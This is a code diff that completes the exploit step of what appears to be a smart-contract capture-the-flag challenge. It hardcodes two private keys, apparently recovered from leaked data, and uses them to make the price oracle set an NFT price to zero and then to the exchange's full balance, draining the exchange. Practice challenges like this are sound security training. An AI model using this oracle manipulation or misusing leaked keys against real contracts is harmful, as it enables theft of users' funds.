@@ -61,6 +61,35 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+
+        // we were able to get the private keys by decoding the hex to base 64 and then decode the base64 text to get the private key
+        let source1Key= "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
+        let source2Key = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        
+        //let's create signers for two of the trusted price sources
+        let provider = ethers.getDefaultProvider();
+        let source1 = new ethers.Wallet(source1Key,deployer.provider);
+        let source2 = new ethers.Wallet(source2Key,deployer.provider);
+
+        //now we will set the price to zero for both these source using the trustful oracle 
+        await this.oracle.connect(source1).postPrice("DVNFT", 0);
+        await this.oracle.connect(source2).postPrice("DVNFT", 0);
+
+        //now we can buy an nft for free
+        await this.exchange.connect(attacker).buyOne({value:ethers.utils.parseEther('0.01')});
+
+        //let's make the price really high now, equal to the total ether balance the exchange has
+        await this.oracle.connect(source1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await this.oracle.connect(source2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        //now we sell to drain the exchange of all its funds
+        await this.nftToken.connect(attacker).approve(this.exchange.address, 0) ;
+        await this.exchange.connect(attacker).sellOne(0);
+
+        //finally we set the price back to what it was
+        await this.oracle.connect(source1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+        await this.oracle.connect(source2).postPrice("DVNFT", INITIAL_NFT_PRICE);
+
     });
 
     after(async function () {
